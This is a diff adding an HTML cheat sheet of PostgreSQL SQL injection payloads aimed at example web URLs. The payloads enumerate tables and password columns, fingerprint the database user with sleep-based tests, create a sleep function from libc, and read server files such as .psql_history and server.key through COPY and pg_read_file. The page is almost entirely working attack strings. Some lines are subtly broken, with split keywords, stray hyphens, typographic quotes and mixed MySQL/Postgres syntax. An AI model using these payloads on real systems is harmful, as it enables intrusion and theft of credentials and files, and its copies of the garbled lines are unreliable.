@@ -1,0 +1,48 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Data extraction</title>
+</head><body><b><span style="font-size: 14pt">Basic extraction</span></b><br/>
+<br/>
+<b>display table names and column names</b><br/>
+<tt><br/>
+AAA'%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--<br/>
+<br/>
+</tt><b>Find table with column name containing PASS</b><br/>
+<tt><br/>
+SELECT table_name,column_name FROM information_schema.columns where column_name LIKE '%PASS%'<br/>
+<br/>
+</tt><b>current user being used for db connection (pg_sleep() in POSTGRES&gt;=8.2)</b><tt><br/>
+</tt><tt><br/>
+select if(user() like 'root@%', pg_sleep(5000), 'false')<br/>
+</tt>for POSTGRES &lt;8.2 create custom pg_sleep()<br/>
+<tt>CREATE function pg_sleep(int) RETURNS int AS ‘/lib/libc.so.6’, ‘sleep’ LANGUAGE ‘C’ STRICT<br/>
+<br/>
+</tt><b>Current user</b><tt><br/>
+</tt><tt><br/>
+SELECT user<br/>
+SELECT current_user<br/>
+SELECT session_user<br/>
+SELECT usename FROM pg_user<br/>
+SELECT getpgusername()<br/>
+http:/www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--<br/>
+</tt><br/>
+<b>Current db</b><br/>
+<tt><br/>
+http:/www.example.com/store.php?id=1 UNION ALL SE- LECT current_database(),NULL,NULL--<br/>
+<br/>
+</tt><b>Reading files</b><br/>
+<br/>
+Create table with file contents using COPY<br/>
+<tt>/store.php?id=1; CREATE TABLE file_store(id serial, data text)--<br/>
+/store.php?id=1; COPY file_store(data) FROM ‘/var/lib/postgresql/.psql_history’--<br/>
+</tt>Reading created file_store table line by line<tt><br/>
+</tt><tt>/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::- text FROM file_store LIMIT 1 OFFSET 1;--<br/>
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--<br/>
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--<br/>
+...<br/>
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--<br/>
+<br/>
+</tt>Reading files in Postgres&gt;=8.1<br/>
+<tt>SELECT pg_read_file(‘server.key’,0,1000);</tt><br/>
+</body></html>
